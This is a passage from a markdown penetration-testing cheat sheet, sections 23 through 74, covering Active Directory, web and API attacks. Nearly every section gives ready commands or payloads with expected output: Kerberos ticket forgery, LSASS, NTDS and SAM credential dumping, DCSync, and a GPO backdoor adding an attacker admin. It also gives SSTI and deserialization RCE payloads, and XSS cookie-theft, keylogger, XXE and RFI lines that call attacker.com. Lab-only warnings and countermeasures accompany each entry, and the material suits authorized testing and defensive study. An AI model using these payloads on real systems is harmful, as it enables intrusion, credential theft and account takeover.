Unlimited domain access — create any user, access any resource, persist indefinitely.

### 🛡️ Countermeasures
Change KRBTGT password twice (with replication gap). Monitor for TGTs with abnormally long lifetimes.

---

## Section 23: Silver Ticket (Service Trust Abuse)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Forges TGS tickets for a specific service using that service account's NTLM hash. More stealthy than Golden Ticket since no DC contact needed.

### 💻 Command / Payload
```bash
ticketer.py -nthash <service_hash> -domain-sid <SID> -domain <domain> -spn MSSQLSvc/<host> user
```

### 📋 Expected Output
Access to specific service (SQL, HTTP, CIFS) without DC validation.

### 🛡️ Countermeasures
Rotate service account passwords regularly. Use MSAs. Monitor for service tickets without prior TGT.

---

## Section 24: Overpass-the-Hash (AS-REQ Request)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Converts an NTLM hash into a Kerberos TGT by performing a legitimate AS-REQ. Bypasses NTLM restrictions while using NTLM hash as source material.

### 💻 Command / Payload
```bash
getTGT.py <domain>/<user> -hashes :<NTLM_hash>
export KRB5CCNAME=<user>.ccache
```

### 📋 Expected Output
Valid Kerberos TGT — use with any Kerberos-authenticated service.

### 🛡️ Countermeasures
Credential Guard, Protected Users group, disable RC4 encryption for Kerberos.

---

## Section 25: Kerberos Constrained Delegation (KCD)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses constrained delegation to impersonate any user to specific services. If a service account is trusted to delegate to CIFS/DC, you can impersonate DA.

### 💻 Command / Payload
```bash
getST.py -spn <target_spn> -impersonate Administrator <domain>/<service_user> -hashes :<hash>
```

### 📋 Expected Output
TGS ticket impersonating DA — access to delegated services as Domain Admin.

### 🛡️ Countermeasures
Minimize delegation. Use Resource-Based delegation. Add sensitive accounts to 'Account is sensitive and cannot be delegated'.

---

## Section 26: Resource-Based Constrained Delegation (RBCD)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
If you can write to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, you can delegate any user to that machine. Common via GenericWrite ACL abuse.

### 💻 Command / Payload
```bash
# Add RBCD: Set msDS-AllowedToActOnBehalfOfOtherIdentity
getST.py -spn cifs/<target> -impersonate Administrator <domain>/<controlled_account>
```

### 📋 Expected Output
Impersonated TGS to target machine — full access as impersonated user.

### 🛡️ Countermeasures
Audit write permissions on computer objects. Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes.

---

## Section 27: Active Directory Certificate Services (ADCS) ESC1

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
ESC1: Certificate template allows requesters to specify arbitrary SANs (Subject Alternative Names). Request a cert as DA by setting UPN to administrator.

### 💻 Command / Payload
```bash
certipy find -u <user>@<domain> -p <pass> -dc-ip <DC>
certipy req -u <user>@<domain> -p <pass> -ca <CA> -template <vuln_template> -upn administrator@<domain>
```

### 📋 Expected Output
PFX certificate authenticating as Domain Admin — use with PKINIT for TGT.

### 🛡️ Countermeasures
Remove 'Supply in the request' from SAN. Require manager approval. Restrict enrollment permissions.

---

## Section 28: ADCS ESC8 (NTLM Relay to HTTP CA)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Relays NTLM authentication (from PetitPotam/PrinterBug) to the CA's HTTP enrollment endpoint. Obtains a certificate as the relayed machine account.

### 💻 Command / Payload
```bash
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### 📋 Expected Output
Machine certificate for DC — use for DCSync via PKINIT S4U2Self.

### 🛡️ Countermeasures
Enable EPA on CA HTTP endpoints. Disable NTLM on CA. Require HTTPS for enrollment.

---

## Section 29: SID History Injection (Child to Forest Root)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects Enterprise Admins SID into a Golden Ticket from a child domain. Grants access to the entire forest — not just the compromised child domain.

### 💻 Command / Payload
```bash
# After compromising child domain:
ticketer.py -nthash <child_krbtgt> -domain-sid <child_SID> -extra-sid <forest_root_SID>-519 Administrator
```

### 📋 Expected Output
Forest-wide Domain Admin access from a single child domain compromise.

### 🛡️ Countermeasures
Enable SID filtering on forest trusts. Monitor for cross-domain TGTs with extra SIDs.

---

## Section 30: GPO Policy Hijacking & Modification

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Modifies Group Policy Objects to push malicious configurations (scheduled tasks, scripts, registry changes) to all computers linked to that GPO.

### 💻 Command / Payload
```bash
# If you have write access to a GPO:
SharpGPOAbuse.exe --AddComputerTask --TaskName 'backdoor' --Author 'NT AUTHORITY\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators attacker /add' --GPOName 'Vulnerable GPO'
```

### 📋 Expected Output
Code execution on all machines in the GPO scope — mass lateral movement.

### 🛡️ Countermeasures
Restrict GPO modification rights. Monitor GPO changes via audit policies. Use GPO versioning.

---

## Section 31: LSA Secrets Dumping

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Extracts LSA secrets from the registry: cached domain credentials, service account passwords, DPAPI keys, and VPN/auto-logon passwords.

### 💻 Command / Payload
```bash
reg save HKLM\SECURITY security.save
reg save HKLM\SYSTEM system.save
secretsdump.py -security security.save -system system.save LOCAL
```

### 📋 Expected Output
Plaintext/hashed service account passwords, cached domain logon hashes.

### 🛡️ Countermeasures
Credential Guard, minimize cached logon count (CachedLogonsCount=0 on servers), Protected Users.

---

## Section 32: SAM Registry Hive Hashing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Extracts local user NTLM hashes from the SAM database. Requires SYSTEM privileges. Hashes can be cracked or used for Pass-the-Hash.

### 💻 Command / Payload
```bash
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL
```

### 📋 Expected Output
Local user NTLM hashes — Administrator, backup accounts, service accounts.

### 🛡️ Countermeasures
Use LAPS for unique local admin passwords. Credential Guard. Restrict local admin access.

---

## Section 33: NTDS.dit Extraction

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Extracts the AD database file containing ALL domain user hashes. Requires DA or backup operator privileges on a Domain Controller.

### 💻 Command / Payload
```bash
# Volume Shadow Copy method:
vssadmin create shadow /for=C:
ntdsutil 'ac i ntds' 'ifm' 'create full C:\ntds_dump' q q
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### 📋 Expected Output
Every single domain user/computer NTLM hash — complete domain compromise.

### 🛡️ Countermeasures
Restrict DC access. Monitor vssadmin/ntdsutil usage. Credential Guard on DCs.

---

## Section 34: LSASS Process Memory Dumping

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Dumps LSASS process memory to extract plaintext passwords, NTLM hashes, Kerberos tickets from currently logged-in users.

### 💻 Command / Payload
```bash
# Mimikatz:
sekurlsa::logonpasswords
# Or:
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp
```

### 📋 Expected Output
Plaintext passwords (pre-Win10), NTLM hashes, Kerberos TGTs/TGSs of logged-in users.

### 🛡️ Countermeasures
Credential Guard, RunAsPPL for LSASS, disable WDigest, minimize interactive logons on servers.

---

## Section 35: Active Directory Domain Controller DCSync

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Simulates domain controller replication (GetNCChanges) to request password hashes for any account. Requires Replicating Directory Changes privilege.

### 💻 Command / Payload
```bash
secretsdump.py <domain>/<user>:<pass>@<DC>
# Or Mimikatz: lsadump::dcsync /domain:<domain> /user:krbtgt
```

### 📋 Expected Output
NTLM hashes for any/all domain accounts including KRBTGT.

### 🛡️ Countermeasures
Audit and restrict DCSync rights. Monitor DRS replication from non-DC sources. Alert on GetNCChanges from workstations.


---

# Phase 3: 🌐 Advanced Web Exploitation

---

## Section 36: SQLMap HTTP Request Injection

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Automates SQL injection using a saved HTTP request file. Tests all parameters, headers, and cookies. --batch uses default answers for non-interactive use.

### 💻 Command / Payload
```bash
sqlmap -r request.txt --batch --dbs
# Save HTTP request from Burp to request.txt first
```

### 📋 Expected Output
Database names, tables, columns, and data extraction.

### 🛡️ Countermeasures
Parameterized queries, WAF rules, input validation, least-privilege DB accounts.

---

## Section 37: SQLMap Blind Time-Based Exploitation

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Forces time-based blind injection. The payload causes the DB to sleep for N seconds if the condition is true — no visible output, only timing differences.

### 💻 Command / Payload
```bash
sqlmap -u 'http://<target>/page?id=1' --technique=T --time-sec=5 --batch
```

### 📋 Expected Output
Slower but works when no errors/output visible. Extracts data one bit at a time via delays.

### 🛡️ Countermeasures
Same as SQLi. Additionally, set query timeouts in the database to limit sleep() impact.

---

## Section 38: SQLMap OS-Shell Injection

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Escalates SQLi to operating system command execution via techniques like xp_cmdshell (MSSQL), INTO OUTFILE (MySQL), or COPY TO (PostgreSQL).

### 💻 Command / Payload
```bash
sqlmap -u 'http://<target>/page?id=1' --os-shell --batch
```

### 📋 Expected Output
Interactive OS shell on the database server — full system compromise.

### 🛡️ Countermeasures
Disable xp_cmdshell, restrict FILE privilege, run DB as non-root, disable INTO OUTFILE.

---

## Section 39: Blind NoSQL Injection (MongoDB)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits MongoDB query operators ($gt, $ne, $regex, $where) injected through user input. Bypasses authentication or extracts data without SQL syntax.

### 💻 Command / Payload
```bash
# Payload in JSON body:
{"username": {"$gt": ""}, "password": {"$gt": ""}}
# Or URL: ?username[$ne]=invalid&password[$gt]=
```

### 📋 Expected Output
Authentication bypass, data enumeration via boolean/regex-based extraction.

### 🛡️ Countermeasures
Input validation, disable $where operator, use Mongoose schema validation, sanitize operators.

---

## Section 40: Out-of-Band (OOB) SQL Injection

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
When no direct output or timing is available, forces the DB to make external network requests to attacker-controlled infrastructure, exfiltrating data via DNS/HTTP.

### 💻 Command / Payload
```bash
# MSSQL: '; exec master..xp_dirtree '//attacker.com/share' --
# MySQL: SELECT LOAD_FILE('\\\\attacker.com\\share\\file')
```

### 📋 Expected Output
DNS/HTTP callbacks on attacker server confirm injection and carry extracted data.

### 🛡️ Countermeasures
Block outbound connections from DB servers. Network segmentation. DNS monitoring.

---

## Section 41: Server-Side Request Forgery (SSRF) AWS Metadata

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits URL-fetching functionality to access cloud instance metadata. On AWS, this leaks IAM credentials that may grant S3, EC2, or other AWS service access.

### 💻 Command / Payload
```bash
curl 'http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

### 📋 Expected Output
AWS access keys, session tokens, IAM role names — full cloud account compromise potential.

### 🛡️ Countermeasures
Upgrade to IMDSv2 (requires token header). Whitelist allowed URLs. Block 169.254.169.254 in app.

---

## Section 42: SSRF Redis Gopher Protocol Tunneling

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses Gopher protocol via SSRF to send raw TCP data to internal Redis, setting a PHP web shell key, then using CONFIG SET to write it to the web root.

### 💻 Command / Payload
```bash
curl 'http://<target>/fetch?url=gopher://127.0.0.1:6379/_SET%20shell%20%22<%3Fphp%20system($_GET[cmd])%3F>%22'
```

### 📋 Expected Output
Web shell written to server via Redis — full RCE through SSRF chain.

### 🛡️ Countermeasures
Block gopher:// protocol in URL parsers. Require Redis authentication. Network segmentation.

---

## Section 43: Server-Side Template Injection (SSTI) Jinja2 RCE

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects template syntax into Jinja2 (Python/Flask). If user input is rendered as a template, this traverses Python's object hierarchy to reach os.popen() for RCE.

### 💻 Command / Payload
```bash
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### 📋 Expected Output
Command output (e.g., uid=33(www-data)) confirming code execution on the server.

### 🛡️ Countermeasures
Never render user input as templates. Use sandboxed template environments. Input validation.

---

## Section 44: SSTI FreeMarker RCE

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits Java FreeMarker template engine to instantiate the Execute class and run OS commands. Common in Java web applications using template rendering.

### 💻 Command / Payload
```bash
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### 📋 Expected Output
OS command output confirming RCE on Java application server.

### 🛡️ Countermeasures
Disable dangerous built-ins. Use FreeMarker sandbox configuration. Don't render user input as templates.

---

## Section 45: SSTI Thymeleaf RCE

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits Spring/Thymeleaf expression processing. Preprocessed expressions (__${...}__) execute before template rendering, allowing SpEL injection for RCE.

### 💻 Command / Payload
```bash
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

### 📋 Expected Output
Command execution on Spring application server.

### 🛡️ Countermeasures
Disable SpringEL in Thymeleaf. Use th:text (escaped) not th:utext. Input validation.

---

## Section 46: Java Insecure Deserialization

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits Java deserialization of untrusted data using gadget chains from common libraries (Commons Collections, Spring, etc.) to achieve RCE.

### 💻 Command / Payload
```bash
java -jar ysoserial.jar CommonsCollections1 'id' | base64
# Send base64 payload in vulnerable parameter
```

### 📋 Expected Output
Remote code execution through deserialized object chains.

### 🛡️ Countermeasures
Don't deserialize untrusted data. Use allowlists for deserialization classes. Update libraries.

---

## Section 47: Python Pickle Deserialization

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Python's pickle module executes arbitrary code during deserialization via __reduce__. Any user-controlled pickle input = guaranteed RCE.

### 💻 Command / Payload
```bash
import pickle, os
class Exploit: __reduce__ = lambda s: (os.system, ('id',))
pickle.dumps(Exploit())
```

### 📋 Expected Output
Arbitrary code execution in the Python application context.

### 🛡️ Countermeasures
Never unpickle untrusted data. Use JSON instead. If pickle required, use hmac signing.

---

## Section 48: PHP Object Injection

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits PHP unserialize() with user-controlled input. If the application has classes with dangerous magic methods (__destruct, __wakeup, __toString), triggers code execution.

### 💻 Command / Payload
```bash
O:8:"Backdoor":1:{s:4:"cmd";s:2:"id";}
```

### 📋 Expected Output
Code execution via PHP magic method chains (POP chains).

### 🛡️ Countermeasures
Never unserialize user input. Use json_decode() instead. Disable dangerous classes.

---

## Section 49: XML External Entity (XXE) Local File Read

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Defines an external entity pointing to a local file. When the XML parser resolves &xxe;, it includes the file content in the response.

### 💻 Command / Payload
```bash
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

### 📋 Expected Output
Content of /etc/passwd or other local files in the XML response.

### 🛡️ Countermeasures
Disable external entity processing. Use defusedxml (Python), disable DTDs in parser config.

---

## Section 50: XXE Blind OOB Data Exfiltration

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
When XXE output isn't reflected, uses external DTD to read files and send content to attacker server via HTTP/DNS parameter.

### 💻 Command / Payload
```bash
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>
# evil.dtd: <!ENTITY % file SYSTEM "file:///etc/passwd">
#           <!ENTITY % send SYSTEM "http://attacker.com/?d=%file;">
```

### 📋 Expected Output
File content received on attacker's HTTP server.

### 🛡️ Countermeasures
Same as XXE: disable DTDs, external entities, and parameter entities in XML parsers.

---

## Section 51: JWT Signature Bypass (None Algorithm)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Changes the JWT algorithm to 'none', making the signature unnecessary. If the server doesn't validate the algorithm field, it accepts unsigned tokens.

### 💻 Command / Payload
```bash
# Change JWT header to: {"alg":"none","typ":"JWT"}
# Remove signature portion, keep trailing dot
```

### 📋 Expected Output
Authentication bypass — forge tokens for any user including admin.

### 🛡️ Countermeasures
Always validate JWT algorithm server-side. Reject 'none' algorithm. Use allowlist for algorithms.

---

## Section 52: JWT Key Confusion Attack

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
If server uses RS256 (asymmetric) but accepts HS256 (symmetric), attacker signs the token using the public key as the HMAC secret. Server verifies with same public key.

### 💻 Command / Payload
```bash
# Change header from RS256 to HS256
# Sign with the PUBLIC key as HMAC secret
python3 jwt_tool.py <token> -X k -pk public.pem
```

### 📋 Expected Output
Forged JWT accepted as valid — full authentication bypass.

### 🛡️ Countermeasures
Pin the algorithm in server config. Don't accept algorithm from token header. Separate key types.

---

## Section 53: XSS Cookie Theft Session Hijack

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Stored or reflected XSS that exfiltrates session cookies to attacker server. Attacker replays the cookie to hijack the victim's authenticated session.

### 💻 Command / Payload
```bash
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

### 📋 Expected Output
Session cookies on attacker's HTTP server — full account takeover.

### 🛡️ Countermeasures
HttpOnly flag on cookies. Content Security Policy. Output encoding. SameSite cookie attribute.

---

## Section 54: XSS Keylogger Payload

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects a JavaScript keylogger via XSS. Captures every keystroke on the page and sends it to the attacker — credentials, messages, search queries.

### 💻 Command / Payload
```bash
<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key}</script>
```

### 📋 Expected Output
Real-time keystrokes including passwords and sensitive data on attacker server.

### 🛡️ Countermeasures
CSP headers, input sanitization, output encoding, subresource integrity.

---

## Section 55: Stored XSS CSRF Chain

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Chains stored XSS with CSRF to automatically change victim's email to attacker-controlled address when they view the poisoned page. Enables password reset takeover.

### 💻 Command / Payload
```bash
<script>fetch('/api/change-email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})</script>
```

### 📋 Expected Output
Victim's email silently changed — attacker initiates password reset for account takeover.

### 🛡️ Countermeasures
Fix the XSS vulnerability. Additionally: re-authentication for sensitive changes, CSRF tokens.

---

## Section 56: Cross-Site Request Forgery (CSRF) Password Reset

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Forces authenticated victims to submit a password change request when they visit attacker's page. Works when no CSRF token or SameSite cookie protection exists.

### 💻 Command / Payload
```bash
<form action='https://target.com/api/change-password' method='POST'>
<input type='hidden' name='new_password' value='hacked123'>
</form>
<script>document.forms[0].submit()</script>
```

### 📋 Expected Output
Victim's password changed to attacker's chosen value.

### 🛡️ Countermeasures
CSRF tokens, SameSite=Strict cookies, re-authentication for password changes.

---

## Section 57: LFI Log Poisoning RCE

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects PHP code into server logs (via User-Agent, Referer), then uses LFI to include the log file, executing the injected code.

### 💻 Command / Payload
```bash
# Step 1: Poison the log
curl -A '<?php system($_GET["cmd"]); ?>' http://<target>/
# Step 2: Include the log via LFI
curl 'http://<target>/page?file=../../../../var/log/apache2/access.log&cmd=id'
```

### 📋 Expected Output
RCE via log file inclusion — command output in response.

### 🛡️ Countermeasures
Restrict LFI paths. Separate log storage. Disable PHP execution in log directories.

---

## Section 58: LFI PHP Wrapper Resource Filter Extraction

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses PHP stream wrappers to read PHP source files as base64 instead of executing them. Reveals database credentials, API keys, and application secrets.

### 💻 Command / Payload
```bash
curl 'http://<target>/page?file=php://filter/convert.base64-encode/resource=config.php'
```

### 📋 Expected Output
Base64-encoded PHP source code — decode to get credentials and secrets.

### 🛡️ Countermeasures
Disable allow_url_include. Whitelist allowed file paths. Don't use user input in include().

---

## Section 59: Remote File Inclusion (RFI)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Includes a remote file from attacker's server. If allow_url_include is enabled in PHP, the remote file is fetched and executed on the target server.

### 💻 Command / Payload
```bash
curl 'http://<target>/page?file=http://attacker.com/shell.php'
```

### 📋 Expected Output
Remote PHP file executed on target — full RCE.

### 🛡️ Countermeasures
Disable allow_url_include and allow_url_fopen. Input validation. Whitelist allowed paths.

---

## Section 60: Server-Side Prototype Pollution (NodeJS)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Manipulates JavaScript's prototype chain via user input. If the application merges user JSON into objects, attacker can set properties on Object.prototype affecting all objects.

### 💻 Command / Payload
```bash
# JSON body:
{"__proto__": {"isAdmin": true}}
# Or: {"constructor": {"prototype": {"isAdmin": true}}}
```

### 📋 Expected Output
Privilege escalation, RCE (via polluting child_process options), authentication bypass.

### 🛡️ Countermeasures
Use Object.create(null) for plain objects. Freeze prototypes. Validate input keys against __proto__.

---

## Section 61: HTTP Request Smuggling (CL.TE)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Front-end uses Content-Length, back-end uses Transfer-Encoding. The 'GET /admin' portion is treated as the start of the next request by the back-end, smuggled past the front-end.

### 💻 Command / Payload
```bash
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```

### 📋 Expected Output
Access to restricted endpoints, cache poisoning, credential theft from other users' requests.

### 🛡️ Countermeasures
Normalize TE/CL handling. Disable HTTP/1.1 connection reuse. Use HTTP/2 end-to-end.

---

## Section 62: HTTP Request Smuggling (TE.CL)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Front-end uses Transfer-Encoding (chunked), back-end uses Content-Length. The smuggled request bypasses front-end security controls.

### 💻 Command / Payload
```bash
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

5c
GET /admin HTTP/1.1
Host: target.com
0
```

### 📋 Expected Output
Same impact as CL.TE — unauthorized access, cache poisoning, request hijacking.

### 🛡️ Countermeasures
Same countermeasures: standardize parsing, disable connection reuse, use HTTP/2.

---

## Section 63: Directory Traversal Path Bypass

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Bypasses directory traversal filters using various encoding tricks: double dots, URL encoding, double encoding, null bytes, overlong UTF-8 sequences.

### 💻 Command / Payload
```bash
curl 'http://<target>/download?file=....//....//....//etc/passwd'
# Also: ..%252f..%252f (double encoding), ..%c0%af (overlong UTF-8)
```

### 📋 Expected Output
Access to files outside the web root — /etc/passwd, /etc/shadow, application config.

### 🛡️ Countermeasures
Canonicalize paths before validation. Use chroot. Whitelist allowed directories.

---

## Section 64: Race Condition Web Account Overdraw

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits TOCTOU (Time-of-check-to-time-of-use) race conditions. Multiple concurrent requests processed before balance check, allowing overdraw or coupon reuse.

### 💻 Command / Payload
```bash
# Send 20 concurrent requests:
for i in $(seq 1 20); do curl -s 'http://<target>/api/withdraw?amount=100' -H 'Cookie: session=xxx' & done; wait
```

### 📋 Expected Output
Account balance goes negative, or discount/coupon applied multiple times.

### 🛡️ Countermeasures
Database-level locking (SELECT FOR UPDATE). Atomic transactions. Idempotency keys.

---

## Section 65: Insecure Direct Object Reference (IDOR) File Exfiltration

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Accesses other users' files/documents by manipulating the object ID parameter. The application doesn't verify the authenticated user owns the requested resource.

### 💻 Command / Payload
```bash
curl 'http://<target>/api/documents/1001' -H 'Cookie: session=user_B'
# Increment ID to access other users' files
```

### 📋 Expected Output
Other users' private documents, PII, financial records.

### 🛡️ Countermeasures
Server-side authorization checks on every object access. Use UUIDs instead of sequential IDs.


---

# Phase 4: 🔗 API & GraphQL Security

---

## Section 66: REST API Endpoint Discovery (ffuf)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Performs brute-force discovery of hidden API endpoints, versions, and sub-resources. High-frequency fuzzing helps map unlinked REST endpoints.

### 💻 Command / Payload
```bash
ffuf -w common_api_endpoints.txt -u http://<target>/api/v1/FUZZ -mc 200,201,401,403
```

### 📋 Expected Output
List of discovered API endpoints (e.g., /users, /config, /debug) along with HTTP status codes.

### 🛡️ Countermeasures
API gateways, rate limiting, IP blocklists, authentication requirements, and disabling debug endpoints.

---

## Section 67: Broken Object Level Authorization (BOLA)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Accesses resource objects by manipulating their IDs in the API endpoint. Occurs when authorization checks are missing for the resource owner.

### 💻 Command / Payload
```bash
curl -X GET http://<target>/api/v1/trips/9991 -H 'Authorization: Bearer <user_token>'
```

### 📋 Expected Output
Access to travel logs, profile info, or personal records of other users.

### 🛡️ Countermeasures
Object-level authorization verification on every request. Map user identity directly to resource database queries.

---

## Section 68: Broken Object Property Level Authorization (BOPLA)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Updates or reads sensitive object properties that should not be user-modifiable. Often targets role fields or financial balances.

### 💻 Command / Payload
```bash
curl -X PUT http://<target>/api/v1/users/me -H 'Content-Type: application/json' -d '{"is_admin":true,"balance":999999}'
```

### 📋 Expected Output
HTTP 200 with object state showing modified admin flags or balances.

### 🛡️ Countermeasures
Schema validation, strict input property filtering (mass assignment prevention), separate read/write data transfer objects (DTOs).

---

## Section 69: GraphQL Introspection Query

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Queries the GraphQL schema schema introspection endpoint to map all available queries, mutations, types, and fields.

### 💻 Command / Payload
```bash
curl -X POST http://<target>/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{queryType{name}mutationType{name}types{name,kind,fields{name,type{name,kind}}}}}"}'
```

### 📋 Expected Output
JSON structure exposing the entire API layout, internal models, and fields.

### 🛡️ Countermeasures
Disable GraphQL introspection in production configurations. Turn off default schema explorers (GraphiQL).

---

## Section 70: GraphQL Query Depth Denial of Service (DoS)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sends deeply nested recursive queries to cause stack overflow or resource exhaustion on GraphQL backend parsers.

### 💻 Command / Payload
```bash
curl -X POST http://<target>/graphql -H 'Content-Type: application/json' -d '{"query":"query { author { posts { author { posts { author { posts { name } } } } } } }"}'
```

### 📋 Expected Output
HTTP 502/504 gateway timeout, or backend application denial of service.

### 🛡️ Countermeasures
Implement maximum query depth limits. Reject queries exceeding safe complexity scores.

---

## Section 71: GraphQL Batch Query Attack

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Batches hundreds of query/mutation requests into a single HTTP POST request, bypassing traditional request-rate limits and firewalls.

### 💻 Command / Payload
```bash
curl -X POST http://<target>/graphql -H 'Content-Type: application/json' -d '[{"query":"mutation { login(user:\"admin\", pass:\"a\") }"}, {"query":"mutation { login(user:\"admin\", pass:\"b\") }"}]'
```

### 📋 Expected Output
Fast responses of multiple operations, allowing rapid brute-forcing or database scraping.

### 🛡️ Countermeasures
Disable query batching if not required. Enforce total operation limits per request. Implement rate limits at the resolver level.

---

## Section 72: REST API Mass Assignment

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects extra parameters into REST creation/update requests. Bypasses client-side form controls to set server-side values directly.

### 💻 Command / Payload
```bash
curl -X POST http://<target>/api/users -H 'Content-Type: application/json' -d '{"username":"test","password":"test","role":"Admin"}'
```

### 📋 Expected Output
User created or updated with administrative role permissions.

### 🛡️ Countermeasures
Use DTOs (Data Transfer Objects). Define strict schema binding lists. Filter input parameters against strict allowlists.

---

## Section 73: API Key Leakage (Github Scraping)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Scans GitHub commit histories, repositories, and issues for leaked API keys, database credentials, and certificates.

### 💻 Command / Payload
```bash
trufflehog github --org=<org_name> --only-verified
```

### 📋 Expected Output
Leaked AWS keys, Slack webhooks, database credentials, or private SSH keys.

### 🛡️ Countermeasures
Regular repository scanning. Implement pre-commit hooks (Talisman/GitLeaks). Revoke compromised keys immediately.

---

## Section 74: Server-Side Parameter Pollution (SSPP)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Appends extra parameters to internal requests made by the server, hijacking logical behavior on backend APIs.

### 💻 Command / Payload
```bash
curl http://<target>/api/search?q=test%26admin=true
```

### 📋 Expected Output
Bypassed authentication, access to restricted search results, or administrative actions.

### 🛡️ Countermeasures
Strict URL encoding, input sanitization, and parameterized API calls on the backend.

---

